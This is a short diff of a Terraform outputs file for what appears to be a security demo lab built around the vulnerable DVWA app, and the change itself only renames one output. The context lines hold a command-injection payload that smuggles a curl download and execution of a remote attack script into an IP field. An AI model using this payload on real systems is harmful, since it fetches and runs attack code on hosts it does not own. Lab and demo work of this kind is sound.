@@ -135,7 +135,7 @@ output "get_public_ip" {
 output "dvwa_cmd_injection_text" {
   value = "127.0.0.1; curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/s1-wiz-attack.sh; chmod +x s1-wiz-attack.sh; ./s1-wiz-attack.sh ${local.workstation-external-cidr}"
 }
-output "install agent" {
+output "install_agent" {
   value = "chmod +x s1-agent-helper.sh; ./s1-agent-helper.sh ${var.s1_console_prefix} ${var.s1_api_key} ${var.s1_site_token_aws} ${var.s1_agent_status}"
 }
 
